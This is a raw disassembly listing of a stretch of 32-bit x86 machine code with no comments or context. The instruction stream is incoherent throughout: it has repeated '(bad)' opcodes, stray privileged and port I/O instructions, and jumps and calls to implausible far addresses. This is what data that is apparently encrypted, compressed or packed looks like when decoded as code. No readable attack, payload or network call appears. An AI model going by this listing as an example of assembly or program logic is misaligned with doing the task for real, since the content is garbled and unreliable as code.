  40e056:	sub    ah,BYTE PTR [edx]
  40e058:	imul   edx,DWORD PTR [eax-0x47e5767b],0x34
  40e05f:	sub    BYTE PTR [ebp-0x2386b311],0xf1
  40e066:	sar    DWORD PTR [ecx-0x6],1
  40e069:	pusha  
  40e06a:	xchg   esp,eax
  40e06b:	xlat   BYTE PTR ds:[ebx]
  40e06c:	jge    0x40e027
  40e06e:	icebp  
  40e06f:	lock xchg esi,eax
  40e071:	mov    ss,esi
  40e073:	out    dx,eax
  40e074:	push   edi
  40e075:	scas   al,BYTE PTR es:[edi]
  40e076:	loope  0x40e046
  40e078:	lahf   
  40e079:	inc    ecx
  40e07a:	cmp    eax,0xaa22ea00
  40e07f:	inc    eax
  40e080:	add    bl,ah
  40e082:	dec    edi
  40e083:	mov    al,dh
  40e085:	mov    DWORD PTR [ecx-0x2e],esp
  40e088:	icebp  
  40e089:	dec    bl
  40e08b:	ror    BYTE PTR [edi-0x6c],1
  40e08e:	push   eax
  40e08f:	sbb    al,0xb7
  40e091:	xor    BYTE PTR [eax],ch
  40e093:	adc    BYTE PTR [edx+0x4b7b0b3d],dl
  40e099:	in     al,dx
  40e09a:	rol    DWORD PTR [ebp+0x3b],0xf5
  40e09e:	je     0x40e078
  40e0a0:	xchg   edx,eax
  40e0a1:	fisubr WORD PTR [eax-0x46]
  40e0a4:	inc    edx
  40e0a5:	push   ebx
  40e0a6:	sti    
  40e0a7:	push   esi
  40e0a8:	arpl   WORD PTR [ecx-0x6a],sp
  40e0ab:	mov    edx,0x21692478
  40e0b1:	xor    BYTE PTR [esi+0x29],ch
  40e0b4:	mov    esi,0x47e1177
  40e0b9:	and    al,0x23
  40e0bb:	dec    esp
  40e0bc:	and    ebx,DWORD PTR [edi+0x17]
  40e0bf:	icebp  
  40e0c0:	pop    ebx
  40e0c1:	cs push ss
  40e0c3:	dec    BYTE PTR [esi]
  40e0c5:	inc    edi
  40e0c6:	cmp    bl,BYTE PTR [eax+0x66656e50]
  40e0cc:	aas    
  40e0cd:	sub    BYTE PTR [ebx+0xd],bl
  40e0d0:	in     al,dx
  40e0d1:	stos   DWORD PTR es:[edi],eax
  40e0d2:	mov    BYTE PTR [edi+0x43],cl
  40e0d5:	dec    eax
  40e0d6:	in     al,dx
  40e0d7:	mov    ecx,0xa21f182
  40e0dc:	push   esi
  40e0dd:	cwde   
  40e0de:	cmp    eax,edx
  40e0e0:	inc    ebx
  40e0e1:	or     bh,bh
  40e0e3:	push   eax
  40e0e4:	daa    
  40e0e5:	int3   
  40e0e6:	xchg   esi,eax
  40e0e7:	push   edi
  40e0e8:	sbb    dl,BYTE PTR [esi+0xccdbafa]
  40e0ee:	sbb    dh,BYTE PTR [ebx+0x39f337d9]
  40e0f4:	jle    0x40e13c
  40e0f6:	fcomi  st,st(5)
  40e0f8:	loope  0x40e0e5
  40e0fa:	outs   dx,DWORD PTR ds:[esi]
  40e0fb:	pop    ebp
  40e0fc:	test   bl,bh
  40e0fe:	js     0x40e09b
  40e100:	mov    dl,0x20
  40e102:	mov    BYTE PTR [esi],dl
  40e104:	or     BYTE PTR [esi-0x4f],bl
  40e107:	push   eax
  40e108:	dec    ebx
  40e109:	push   ebx
  40e10a:	lods   eax,DWORD PTR ds:[esi]
  40e10b:	mov    esi,0xbc78c75c
  40e110:	or     DWORD PTR [edx+0x437b5501],ebx
  40e116:	jno    0x40e172
  40e118:	ins    BYTE PTR es:[edi],dx
  40e119:	jmp    0xeb396d15
  40e11e:	and    ecx,DWORD PTR [ebx+0x1487832e]
  40e124:	pop    esp
  40e125:	fwait
  40e126:	ror    DWORD PTR [edx],1
  40e128:	je     0x40e149
  40e12a:	jp     0x40e160
  40e12c:	inc    ebp
  40e12d:	sti    
  40e12e:	inc    ebx
  40e12f:	imul   ecx,DWORD PTR [edx+0x51],0xaeefb36f
  40e136:	es mov bl,0xf1
  40e139:	int    0x4f
  40e13b:	mov    esp,edx
  40e13d:	or     edi,edx
  40e13f:	pop    ss
  40e140:	in     al,dx
  40e141:	mov    cl,al
  40e143:	mov    ds:0xef05c9d0,al
  40e148:	(bad)  
  40e149:	mov    esi,0x5f863970
  40e14e:	(bad)  
  40e14f:	popa   
  40e150:	iret   
  40e151:	ins    DWORD PTR es:[edi],dx
  40e152:	fbld   TBYTE PTR [esi-0x6bde50fc]
  40e158:	xchg   esi,eax
  40e159:	jle    0x40e151
  40e15b:	not    cl
  40e15d:	mov    BYTE PTR gs:[ecx-0x43],bh
  40e161:	adc    DWORD PTR [eax-0x32],esp
  40e164:	int    0xd1
  40e166:	pop    ds
  40e167:	dec    ebp
  40e168:	(bad)  
  40e16a:	jp     0x40e11a
  40e16c:	cmp    esp,DWORD PTR [edx+0x66]
  40e16f:	add    ch,al
  40e171:	clc    
  40e172:	arpl   WORD PTR [edi],cx
  40e174:	mov    edx,0x3bac21d4
  40e179:	(bad)  
  40e17a:	jns    0x40e107
  40e17c:	dec    ebx
  40e17d:	cmp    eax,0x33597a93
  40e182:	xchg   ebp,ecx
  40e184:	neg    BYTE PTR [edi-0x14819d3b]
  40e18a:	sbb    al,0x3f
  40e18c:	cmp    edi,DWORD PTR fs:[ebp-0x24]
  40e190:	sbb    esi,0x25
  40e193:	sub    DWORD PTR [edi+0x232f633f],esp
  40e199:	mov    fs,WORD PTR [esi-0x57]
  40e19c:	clc    
  40e19d:	adc    eax,0xf38205cc
  40e1a2:	mov    edi,0x2e93c538
  40e1a7:	mov    al,0x75
  40e1a9:	or     ebp,edi
  40e1ab:	mov    esp,DWORD PTR ds:0xa4e1a380
  40e1b1:	test   BYTE PTR [eax-0x63292f33],cl
  40e1b7:	into   
  40e1b8:	lea    esi,[edi]
  40e1ba:	cmp    edi,edi
  40e1bc:	stos   BYTE PTR es:[edi],al
  40e1bd:	inc    ebx
  40e1be:	dec    edi
  40e1bf:	inc    edx
  40e1c0:	push   0xffffffc2
  40e1c2:	aam    0xa4
  40e1c4:	scas   al,BYTE PTR es:[edi]
  40e1c5:	jl     0x40e1ec
  40e1c7:	add    eax,0xbad697af
  40e1cc:	gs xor eax,0x2f42bdd4
  40e1d2:	mov    bh,0x3a
  40e1d4:	not    ah
  40e1d6:	inc    ebx
  40e1d7:	push   ebx
  40e1d8:	ins    BYTE PTR es:[edi],dx
  40e1d9:	inc    edx
  40e1da:	aad    0xbe
  40e1dc:	shl    BYTE PTR [edi],cl
  40e1de:	aas    
  40e1df:	js     0x40e225
  40e1e1:	(bad)  
  40e1e2:	push   0x61
  40e1e4:	mov    ebx,0xf66bdf33
  40e1e9:	cmp    DWORD PTR [ecx-0x3b3e6d92],eax
  40e1ef:	sub    DWORD PTR [edx],esp
  40e1f1:	cmp    cl,BYTE PTR [edx-0x18]
  40e1f4:	ss aad 0x27
  40e1f7:	sub    eax,DWORD PTR [edx]
  40e1f9:	or     eax,ecx
  40e1fb:	sar    esi,0x9f
  40e1fe:	ins    BYTE PTR es:[edi],dx
  40e1ff:	pop    es
  40e200:	(bad)  
  40e201:	(bad)  
  40e202:	ret    0x3a72
  40e205:	test   DWORD PTR [ecx+0x7a9e6bd3],esi
  40e20b:	mov    bh,0x56
  40e20d:	mov    al,0x54
  40e20f:	jp     0x40e1f7
  40e211:	pop    ecx
  40e212:	test   eax,0x84a49fc8
  40e217:	in     eax,dx
  40e218:	mov    bh,0x23
  40e21a:	test   DWORD PTR [edx],0x6d698058
  40e220:	jno    0x40e1bf
  40e222:	mov    ebx,0x587392d9
  40e227:	push   esp
  40e228:	cmc    
  40e229:	hlt    
  40e22a:	call   0x87fdac46
  40e22f:	push   esi
  40e230:	in     eax,dx
  40e231:	in     eax,0xf0
  40e233:	and    edx,DWORD PTR ds:0x6fed4e7a
  40e239:	pop    ss
  40e23a:	sub    ebp,ebp
  40e23c:	vmovaps ymm3,ymm2
  40e240:	push   eax
  40e241:	add    eax,0x5a8ba768
  40e246:	and    edx,DWORD PTR [ecx-0x77800f1]
  40e24c:	jnp    0x40e249
  40e24e:	outs   dx,BYTE PTR ds:[esi]
  40e24f:	ins    BYTE PTR es:[edi],dx
  40e250:	(bad)  
  40e251:	shl    BYTE PTR [ebx+0x2e521fff],cl
  40e257:	and    eax,0x30fcba35
  40e25c:	ss clc 
  40e25e:	cmp    ecx,DWORD PTR [ebx]
  40e260:	imul   edi,DWORD PTR [edx],0xffffffda
  40e263:	push   cs
  40e264:	push   edx
  40e265:	inc    ecx
  40e266:	fcmovbe st,st(4)
  40e268:	fs or  eax,0xc35a953f
  40e26e:	icebp  
  40e26f:	xchg   DWORD PTR ds:0x337c7fb5,eax
  40e275:	xor    dh,BYTE PTR [esi]
  40e277:	inc    ecx
  40e278:	dec    edx
  40e279:	icebp  
  40e27a:	jmp    0x85b4ff52
  40e27f:	jb     0x40e2a0
  40e281:	jecxz  0x40e2c7
  40e283:	cdq    
  40e284:	jp     0x40e2b8
  40e286:	out    0x3a,eax
  40e288:	push   edx
  40e289:	mov    ds:0x182e3783,al
  40e28e:	fstp   DWORD PTR [eax]
  40e290:	jae    0x40e2b0
  40e292:	call   0x76c7eafe
  40e297:	push   0x61a9ab4
  40e29c:	push   edi
  40e29d:	or     al,0xc
  40e29f:	div    DWORD PTR [eax+0x6bf839a2]
  40e2a5:	loope  0x40e321
  40e2a7:	push   edx
  40e2a8:	ficomp WORD PTR [ebx-0x5d]
  40e2ab:	fs jle 0x40e247
  40e2ae:	cld    
  40e2af:	push   ebp
  40e2b0:	or     esi,ebx
  40e2b2:	sbb    eax,0x2976d741
  40e2b7:	retf   
  40e2b8:	in     al,0xa5
  40e2ba:	pop    eax
  40e2bb:	icebp  
  40e2bc:	test   DWORD PTR [edx+eiz*4],esi
  40e2bf:	or     al,0x4
  40e2c1:	hlt    
  40e2c2:	stos   DWORD PTR es:[edi],eax
  40e2c3:	loope  0x40e27f
  40e2c5:	leave  
  40e2c6:	and    al,0x91
  40e2c8:	in     eax,0x2a
  40e2ca:	les    esi,FWORD PTR [ebp+0x6f]
  40e2cd:	adc    BYTE PTR [ebp+0x79],0x22
  40e2d1:	mov    cl,0x34
  40e2d3:	fstp   DWORD PTR [eax]
  40e2d5:	dec    esp
  40e2d6:	neg    DWORD PTR [edx-0x59]
  40e2d9:	leave  
  40e2da:	cmp    al,0x39
  40e2dc:	jge    0x40e309
  40e2de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2df:	xchg   edi,eax
  40e2e0:	xchg   BYTE PTR [ecx+0x19],dh
  40e2e3:	into   
  40e2e4:	push   ebp
  40e2e5:	and    bh,BYTE PTR [edx-0xcbce662]
  40e2eb:	push   es
  40e2ec:	pop    ecx
  40e2ed:	sub    esp,DWORD PTR [esi+0x1046acc2]
  40e2f3:	mov    eax,0xad156edb
  40e2f8:	jne    0x40e33e
  40e2fa:	pop    ds
  40e2fb:	push   ecx
  40e2fc:	nop
  40e2fd:	pop    eax
  40e2fe:	mov    ecx,0x78b1e9d3
  40e303:	jge    0x40e348
  40e305:	xchg   DWORD PTR [esi],esi
  40e307:	ins    DWORD PTR es:[edi],dx
  40e308:	outs   dx,BYTE PTR ds:[esi]
  40e309:	popf   
  40e30a:	sub    BYTE PTR ds:0xbb50d953,ah
  40e310:	cmp    DWORD PTR [ebx],ebp
  40e312:	cmp    DWORD PTR [ecx],ebx
  40e314:	inc    ebx
  40e315:	mov    DWORD PTR [edi+eax*1],esi
  40e318:	aam    0x13
  40e31a:	data16 int3 
  40e31c:	lea    ecx,[ebp+0xefd1628]
  40e322:	les    edi,FWORD PTR [ebp+0xf]
  40e325:	push   ds
  40e326:	add    eax,0xdeaf9cd4
  40e32b:	xor    al,0xbe
  40e32d:	add    BYTE PTR [esi+0x58],dh
  40e330:	rcl    esi,0xc6
  40e333:	xor    eax,ebp
  40e335:	gs mov ebp,0x34d70e48
  40e33b:	cs bnd jo 0x40e2ec
  40e33f:	cmp    edx,ebx
  40e341:	and    BYTE PTR [ecx],ah
  40e343:	pop    ecx
  40e344:	sbb    al,0x2a
  40e346:	pop    edi
  40e347:	aaa    
  40e348:	imul   ebx,DWORD PTR ds:0x138056e1,0x35
  40e34f:	cli    
  40e350:	and    BYTE PTR [ebp+0x1a],0x44
  40e354:	pextrw esi,(bad),0xc5
  40e356:	jo     0x40e36f
  40e358:	push   ss
  40e359:	xlat   BYTE PTR ds:[ebx]
  40e35a:	adc    dl,ah
  40e35c:	ficomp WORD PTR [ecx-0x71]
  40e35f:	and    BYTE PTR [ebx],ch
  40e361:	jp     0x40e32c
  40e363:	repz ss mov ebp,0xf838009d
  40e36a:	fmul   QWORD PTR [eax-0x41]
  40e36d:	call   0xdc43:0xdce8b356
  40e374:	daa    
  40e375:	enter  0x20df,0xae
  40e379:	sbb    BYTE PTR [ecx+0x9807ab3],0xaf
  40e380:	rcl    DWORD PTR [eax+0x18594502],0x81
  40e387:	mov    bl,0x8a
  40e389:	ins    DWORD PTR es:[edi],dx
  40e38a:	and    ebp,DWORD PTR [ebx]
  40e38c:	mov    ds:0xc7188068,al
  40e391:	mov    dh,0x61
  40e393:	dec    ecx
  40e394:	dec    ebx
  40e395:	aam    0x20
  40e397:	mov    cl,0xd8
  40e399:	retf   
  40e39a:	idiv   DWORD PTR [edi]
  40e39c:	mov    ebp,eax
  40e39e:	retf   
  40e39f:	mov    ah,ch
  40e3a1:	pop    ecx
  40e3a2:	pop    bp
  40e3a4:	push   0x5f
  40e3a6:	ror    esp,cl
  40e3a8:	sbb    eax,0x6da235dd
  40e3ad:	add    al,0x9f
  40e3af:	push   eax
  40e3b0:	xchg   BYTE PTR [ecx],cl
  40e3b2:	pop    esp
  40e3b3:	ds mov esp,cs
  40e3b6:	cmp    eax,0x257b34f4
  40e3bb:	lds    esi,FWORD PTR [ebx-0x64]
  40e3be:	or     DWORD PTR [edx+0xc],ecx
  40e3c1:	gs repz dec eax
  40e3c4:	sbb    al,0x3d
  40e3c6:	cwde   
  40e3c7:	pop    esp
  40e3c8:	frstpm(287 only) 
  40e3ca:	ss mov esi,0xac531a07
  40e3d1:	repnz and eax,0x89aab388
  40e3d7:	xchg   edx,eax
  40e3d8:	dec    edx
  40e3d9:	shl    BYTE PTR [ecx+0x0],cl
  40e3dc:	and    bh,dh
  40e3de:	test   eax,0xe67cbbd9
  40e3e3:	pop    ebx
  40e3e4:	rol    DWORD PTR [edi],cl
  40e3e6:	stos   BYTE PTR es:[edi],al
  40e3e7:	jp     0x40e448
  40e3e9:	out    0xbf,eax
  40e3eb:	add    al,0x7f
  40e3ed:	dec    edi
  40e3ee:	cmp    dh,BYTE PTR [edi-0x14b02254]
  40e3f4:	push   ebp
  40e3f5:	sar    BYTE PTR [edi-0x53],1
  40e3f8:	ss pop edx
  40e3fa:	fbstp  TBYTE PTR [ebx-0x7e397b8e]
  40e400:	jge    0x40e44d
  40e402:	enter  0xf774,0xca
  40e406:	cld    
  40e407:	xchg   edi,eax
  40e408:	popa   
  40e409:	fld1   
  40e40b:	mov    WORD PTR [edi],fs
  40e40d:	adc    eax,0x4e96453c
  40e412:	test   al,0x25
  40e414:	xchg   ecx,eax
  40e415:	gs aas 
  40e417:	and    BYTE PTR [ebx+0x42031dd1],cl
  40e41d:	jbe    0x40e404
  40e41f:	das    
  40e420:	(bad)  
  40e421:	fsub   QWORD PTR [edi]
  40e423:	push   ecx
  40e424:	mov    al,ds:0xbc607670
  40e429:	fwait
  40e42a:	aad    0x10
  40e42c:	into   
  40e42d:	push   esp
  40e42e:	sub    DWORD PTR [esi],0xffffffe4
  40e431:	test   eax,0x3aa16507
  40e436:	repnz xchg ecx,eax
  40e438:	and    al,0x5f
  40e43a:	retf   
  40e43b:	rcl    DWORD PTR [esi-0x7d48eb11],1
  40e441:	xchg   ecx,eax
  40e442:	sbb    al,0xf9
  40e444:	jo     0x40e3ff
  40e446:	pop    ecx
  40e447:	sbb    eax,0x1afa25b4
  40e44c:	adc    DWORD PTR [edx+edi*1+0x3b00db0c],edi
  40e453:	into   
  40e454:	mul    bh
  40e456:	mov    eax,0x143cf4a4
  40e45b:	rcl    BYTE PTR [ebp-0x53a857dd],1
  40e461:	push   edx
  40e462:	fst    DWORD PTR [esi+0x629e84f5]
  40e468:	sub    dh,ah
  40e46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e46b:	push   ecx
  40e46c:	dec    edi
  40e46d:	out    dx,eax
  40e46e:	shl    ebx,cl
  40e470:	xor    dh,BYTE PTR [eax+0x288c1363]
  40e476:	mov    ebx,edx
  40e478:	test   eax,0x7d214a2
  40e47d:	sbb    edi,DWORD PTR [edx+eiz*8+0x77]
  40e481:	stos   BYTE PTR es:[edi],al
  40e482:	adc    BYTE PTR [edx+0x3c],cl
  40e485:	call   0x8f645677
  40e48a:	rol    DWORD PTR [ebp+0x5c],1
  40e48d:	jmp    0x40e4cf
  40e48f:	sbb    dl,BYTE PTR [eax+0x3cd82f14]
  40e495:	xchg   edi,eax
  40e496:	inc    ebx
  40e497:	jnp    0x40e471
  40e499:	(bad)  
  40e49a:	inc    esp
  40e49b:	xchg   esi,eax
  40e49c:	std    
  40e49d:	cdq    
  40e49e:	adc    edx,DWORD PTR [ebp+0x14]
  40e4a1:	fisttp DWORD PTR [ebx-0x16]
  40e4a4:	or     bh,al
  40e4a6:	icebp  
  40e4a7:	adc    al,0x6c
  40e4a9:	mov    ds:0xa6b66446,al
  40e4ae:	ins    DWORD PTR es:[edi],dx
  40e4af:	push   esp
  40e4b0:	das    
  40e4b1:	fld    TBYTE PTR [ecx+esi*8]
  40e4b4:	push   ecx
  40e4b5:	repnz imul ebp,DWORD PTR [edx+eiz*8-0x35],0x4547f805
  40e4be:	int3   
  40e4bf:	push   esp
  40e4c0:	add    al,0x74
  40e4c2:	xor    ecx,DWORD PTR [edi-0x1]
  40e4c5:	mov    ebp,0x79855899
  40e4ca:	cmp    bl,BYTE PTR [ecx-0x64c5f961]
  40e4d0:	mov    ch,ah
  40e4d2:	std    
  40e4d3:	cld    
  40e4d4:	imul   ecx
  40e4d6:	mov    bl,0x12
  40e4d8:	and    ah,ch
  40e4da:	aaa    
  40e4db:	adc    DWORD PTR cs:[eax+0x4159ece1],edx
  40e4e2:	or     esp,DWORD PTR ds:0x44611027
  40e4e8:	mov    cl,0x61
  40e4ea:	add    eax,0x9197ebb8
  40e4ef:	or     eax,0x17d1b76d
  40e4f4:	mov    bh,BYTE PTR ds:0xb69f9018
  40e4fa:	ins    DWORD PTR es:[edi],dx
  40e4fb:	xchg   BYTE PTR [eax+ebp*1-0x1bb9d2e5],ah
  40e502:	(bad)
  40e505:	lea    ecx,es:[ecx]
  40e508:	lods   eax,DWORD PTR ds:[esi]
  40e509:	dec    edx
  40e50a:	adc    ch,BYTE PTR [ebp+0x3da93974]
  40e510:	jb     0x40e4db
  40e512:	push   cs
  40e513:	pusha  
  40e514:	push   es
  40e515:	push   es
  40e516:	pop    ebx
  40e517:	inc    eax
  40e518:	fwait
  40e519:	pop    edi
  40e51a:	loope  0x40e562
  40e51c:	jg     0x40e4d2
  40e51e:	imul   ecx,DWORD PTR [edi],0xcd02a1da
  40e524:	fld    DWORD PTR [edi+0x17]
  40e527:	mov    dl,0xc
  40e529:	jmp    0x40e53a
  40e52b:	mov    dh,dl
  40e52d:	cmp    bh,BYTE PTR [ecx-0x1f]
  40e530:	shl    dh,1
  40e532:	adc    DWORD PTR fs:[ebx+0x5951bb46],edx
  40e539:	jns    0x40e59e
  40e53b:	fstp   TBYTE PTR [esi]
  40e53d:	scas   al,BYTE PTR es:[edi]
  40e53e:	add    al,0xc4
  40e540:	mov    esi,0xfa65413e
  40e545:	cwde   
  40e546:	dec    ebx
  40e547:	inc    ebx
  40e548:	call   0x2a751d7a
  40e54d:	dec    ebx
  40e54e:	in     al,dx
  40e54f:	ret    
  40e550:	(bad)  
  40e551:	popa   
  40e552:	pusha  
  40e553:	leave  
  40e554:	cmp    al,0x24
  40e556:	jo     0x40e4fa
  40e558:	push   di
  40e55a:	aam    0x5b
  40e55c:	in     eax,dx
  40e55d:	mov    ah,0xd8
  40e55f:	mov    al,0xd3
  40e561:	and    DWORD PTR [esi+0x76],esp
  40e564:	xlat   BYTE PTR ds:[ebx]
  40e565:	inc    eax
  40e566:	mov    es,WORD PTR [edx-0x326b7def]
  40e56c:	scas   eax,DWORD PTR es:[edi]
  40e56d:	lds    esi,FWORD PTR [ebx+0x6ade3a44]
  40e573:	sub    DWORD PTR [edi-0xf7da620],esi
  40e579:	fwait
  40e57a:	sbb    al,BYTE PTR [esi]
  40e57c:	rcl    cl,0x4c
  40e57f:	lods   al,BYTE PTR ds:[esi]
  40e580:	push   eax
  40e581:	loop   0x40e510
  40e583:	adc    dl,BYTE PTR [ebp-0x4b8e6087]
  40e589:	jl     0x40e588
  40e58b:	outs   dx,DWORD PTR ds:[esi]
  40e58c:	and    al,0xa8
  40e58e:	mov    dh,0x2a
  40e590:	or     al,0xb4
  40e592:	retf   0x3faf
  40e595:	cmp    eax,0x3464eb76
  40e59a:	jmp    0xc5dc:0x772cc3f9
  40e5a1:	idiv   DWORD PTR [ecx+0x63acd0e4]
  40e5a7:	inc    esi
  40e5a8:	fsubr  DWORD PTR [edx-0x7100d8bf]
  40e5ae:	mov    ds:0xc968102,eax
  40e5b3:	add    ch,al
  40e5b5:	(bad)
  40e5b8:	cdq    
  40e5b9:	adc    BYTE PTR [ecx],ch
  40e5bb:	mov    dl,0x72
  40e5bd:	fidivr DWORD PTR [edi+0x584a62ac]
  40e5c3:	(bad)  
  40e5c4:	sbb    eax,0x9f230eae
  40e5c9:	dec    ecx
  40e5ca:	test   eax,0x2b3c59cd
  40e5cf:	adc    al,0xd4
  40e5d1:	jne    0x40e611
  40e5d3:	out    0x62,eax
  40e5d5:	add    eax,0xd6396eda
  40e5da:	jecxz  0x40e579
  40e5dc:	jbe    0x40e5d9
  40e5de:	test   eax,0x2d9b11f6
  40e5e3:	sub    BYTE PTR [ecx-0xd7e56e9],al
  40e5e9:	pop    es
  40e5ea:	cwde   
  40e5eb:	xor    dl,dh
  40e5ed:	test   DWORD PTR ds:0xa3b0e73b,ebx
  40e5f3:	jb     0x40e5f1
  40e5f5:	pop    ecx
  40e5f6:	pusha  
  40e5f7:	out    dx,eax
  40e5f8:	and    esp,edi
  40e5fa:	jl     0x40e650
  40e5fc:	jb     0x40e614
  40e5fe:	in     eax,0x92
  40e600:	adc    eax,edi
  40e602:	pop    esp
  40e603:	mov    ah,0x50
  40e605:	xchg   edx,eax
  40e606:	mov    dl,0xf6
  40e608:	sub    al,0xd
  40e60a:	repnz leave 
  40e60c:	xchg   edx,eax
  40e60d:	(bad)  
  40e60e:	hlt    
  40e60f:	inc    ebp
  40e610:	xor    eax,0x9f671071
  40e615:	pop    esi
  40e616:	(bad)  
  40e617:	mov    al,ds:0x9ead0c45
  40e61c:	aam    0xe1
  40e61e:	call   0xa90c:0x2ce76efd
  40e625:	mov    DWORD PTR [edi],eax
  40e627:	sbb    eax,0x1e48ed7a
  40e62c:	xor    al,0xb3
  40e62e:	pushf  
  40e62f:	cld    
  40e630:	mov    eax,ss
  40e632:	je     0x40e606
  40e634:	fsubr  st(5),st
  40e636:	sbb    esp,DWORD PTR ds:0x6266dd36
  40e63c:	and    bl,BYTE PTR [eax]
  40e63e:	cmc    
  40e63f:	ja     0x40e6ba
  40e641:	xchg   BYTE PTR [ebp+0x1f],ch
  40e644:	out    0xb9,al
  40e646:	adc    dl,dh
  40e648:	dec    ecx
  40e649:	sub    DWORD PTR [ecx-0x58],ebx
  40e64c:	fidivr DWORD PTR [esi+0xb28ed51]
  40e652:	add    eax,0xcdaf0081
  40e657:	ficomp WORD PTR [ebx+ebp*2+0x24]
  40e65b:	push   DWORD PTR [ebx-0x5c]
  40e65e:	mov    eax,0xcd6efb3d
  40e663:	test   al,cl
  40e665:	mov    al,ds:0x62cf77a4
  40e66a:	addr16 nop
  40e66c:	push   eax
  40e66d:	and    DWORD PTR [esi],ebx
  40e66f:	repz bound esi,QWORD PTR [eax]
  40e672:	dec    ecx
  40e673:	das    
  40e674:	or     BYTE PTR [ecx],0x53
  40e677:	mov    al,0xb7
  40e679:	fcom   DWORD PTR [ebx+0x741087f]
  40e67f:	add    bh,cl
  40e681:	imul   dh
  40e683:	cmp    al,0xbf
  40e685:	(bad)  
  40e686:	xchg   ebp,eax
  40e687:	cwde   
  40e688:	and    bl,BYTE PTR [ebp+0x4c]
  40e68b:	xchg   BYTE PTR [edi-0x3f80025],dh
  40e691:	push   esp
  40e692:	bnd jmp 0x398b4870
  40e698:	ret    
  40e699:	fs adc edi,eax
  40e69c:	cmp    bh,bl
  40e69e:	push   0x66
  40e6a0:	xchg   ebp,eax
  40e6a1:	mov    eax,ds:0x5e9cdfc7
  40e6a6:	jl     0x40e68d
  40e6a8:	inc    edx
  40e6a9:	adc    al,0xe6
  40e6ab:	mov    esi,0x88c2c6be
  40e6b0:	div    DWORD PTR es:[esi-0x3b1bfb3f]
  40e6b7:	pop    ebx
  40e6b8:	sbb    DWORD PTR [eax+0x3c6a78a4],0xffffffbc
  40e6bf:	mov    ch,0x5a
  40e6c1:	repnz fbld TBYTE PTR [edi+0x68]
  40e6c5:	jo     0x40e6ad
  40e6c7:	cwde   
  40e6c8:	in     eax,dx
  40e6c9:	les    edx,FWORD PTR [ebx]
  40e6cb:	dec    eax
  40e6cc:	in     al,0x4e
  40e6ce:	test   DWORD PTR [ebx],edi
  40e6d0:	pop    es
  40e6d1:	js     0x40e716
  40e6d3:	mov    ecx,0x1af8f79e
  40e6d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6d9:	xchg   BYTE PTR [edi+edi*8+0xcb84f2b],dl
  40e6e0:	xchg   edx,eax
  40e6e1:	inc    eax
  40e6e2:	add    DWORD PTR [esi],edi
  40e6e4:	xchg   edx,eax
  40e6e5:	fnstcw WORD PTR [eax]
  40e6e7:	addr16 push 0x7f263295
  40e6ed:	mov    edi,0x14bdb7c7
  40e6f2:	scas   eax,DWORD PTR es:[edi]
  40e6f3:	mov    al,0x1d
  40e6f5:	and    ebp,DWORD PTR [eax-0x35722a90]
  40e6fb:	push   es
  40e6fc:	addr16 dec ecx
  40e6fe:	cmp    BYTE PTR [edx],ah
  40e700:	(bad)  ds:0xdb0bced1
  40e706:	xor    al,0xc2
  40e708:	(bad)  
  40e709:	and    eax,0x5bb76fec
  40e70e:	mov    WORD PTR [eax],es
  40e710:	adc    bl,dh
  40e712:	ret    0xe992
  40e715:	fwait
  40e716:	cmp    bl,BYTE PTR [ebp+0x516b7c14]
  40e71c:	jmp    0x40e6cb
  40e71e:	jae    0x40e769
  40e720:	jecxz  0x40e6f5
  40e722:	or     BYTE PTR [eax-0x9],ah
  40e725:	jge    0x40e6bd
  40e727:	inc    BYTE PTR [ebp-0x51e45af6]
  40e72d:	idiv   BYTE PTR [ebx+0x5f8aad06]
  40e733:	jnp    0x40e762
  40e735:	ficom  WORD PTR ds:0xa7270ca3
  40e73b:	add    BYTE PTR [ecx-0x616bd64c],bh
  40e741:	lock sahf 
  40e743:	mov    edi,0xa46554be
  40e748:	jg     0x40e706
  40e74a:	adc    al,0xab
  40e74c:	add    dh,BYTE PTR [edi+0x47ae9bc7]
  40e752:	outs   dx,BYTE PTR ds:[esi]
  40e753:	cmp    dh,BYTE PTR [edi]
  40e755:	outs   dx,DWORD PTR ds:[esi]
  40e756:	cmp    dl,BYTE PTR [eax-0x36]
  40e759:	test   DWORD PTR [edx-0x36],esi
  40e75c:	adc    al,0xf2
  40e75e:	and    BYTE PTR [eax+0xb54826b],dl
  40e764:	push   0x5
  40e766:	not    edi
  40e768:	loope  0x40e7a3
  40e76a:	jb     0x40e73a
  40e76c:	xchg   edi,eax
  40e76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e76e:	pop    gs
  40e770:	int3   
  40e771:	mov    dh,0x41
  40e773:	mov    ch,0xb1
  40e775:	dec    ebx
  40e776:	int    0x2d
  40e778:	fcom   st(4)
  40e77a:	ror    eax,1
  40e77c:	ret    0xad5c
  40e77f:	jge    0x40e72f
  40e781:	jb     0x40e73a
  40e783:	retf   0x746
  40e786:	retf   0x164f
  40e789:	daa    
  40e78a:	fldenv [esi+0x5c]
  40e78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78e:	xchg   esi,eax
  40e78f:	ds scas eax,DWORD PTR es:[edi]
  40e791:	popa   
  40e792:	mov    ah,0x14
  40e794:	(bad)  
  40e795:	outs   dx,DWORD PTR ds:[esi]
  40e796:	popf   
  40e797:	lds    edx,FWORD PTR ss:[ecx+ecx*4-0x32b312dc]
  40e79f:	fisub  WORD PTR [ebp-0x16]
  40e7a2:	jle    0x40e761
  40e7a4:	jmp    0xc70cde78
  40e7a9:	pop    esp
  40e7aa:	sbb    DWORD PTR [ebx-0x47],esi
  40e7ad:	(bad)  
  40e7ae:	fisub  DWORD PTR [edx+0x7c]
  40e7b1:	push   ss
  40e7b2:	idiv   BYTE PTR [edx+0x32abedf2]
  40e7b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7b9:	(bad)  
  40e7ba:	mov    dl,0x3c
  40e7bc:	repnz inc DWORD PTR [edx+0x58]
  40e7c0:	mov    BYTE PTR ds:0xd3f33e3,cl
  40e7c6:	dec    ebp
  40e7c7:	out    dx,eax
  40e7c8:	rcr    BYTE PTR [esi],0x2
  40e7cb:	sahf   
  40e7cc:	add    DWORD PTR [edi],eax
  40e7ce:	stos   DWORD PTR es:[edi],eax
  40e7cf:	ret    0x32da
  40e7d2:	ret    0xeaa0
  40e7d5:	sub    BYTE PTR [ecx-0x50],0xda
  40e7d9:	dec    esi
  40e7da:	push   cs
  40e7db:	pop    edi
